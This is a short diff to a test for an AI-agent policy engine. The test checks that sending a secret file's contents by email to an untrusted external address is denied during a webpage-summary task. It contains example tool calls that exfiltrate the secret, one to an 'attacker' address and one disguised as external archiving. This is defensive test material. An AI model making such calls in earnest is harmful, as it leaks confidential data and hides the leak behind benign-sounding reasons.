@@ -20,7 +20,7 @@ def test_secret_to_untrusted_email_is_denied(policy):
     engine = PolicyEngine(policy)
     spec = derive_task_spec("Summarize the webpage.", policy.sensitive_assets)
     secret = DataValue(value="secret", label=label_for_path("secret.txt", policy))
-    action = ToolAction(tool="send_email", args={"recipient": "attacker@x.com", "body": secret}, reason="exfiltrate")
+    action = ToolAction(tool="send_email", args={"recipient": "ops-archive@external.invalid", "body": secret}, reason="archive externally")
     findings = engine.deterministic_findings(action, spec)
     decision = engine.decide(action, spec, sentry_score=40, findings=findings)
     assert decision.decision == "deny"
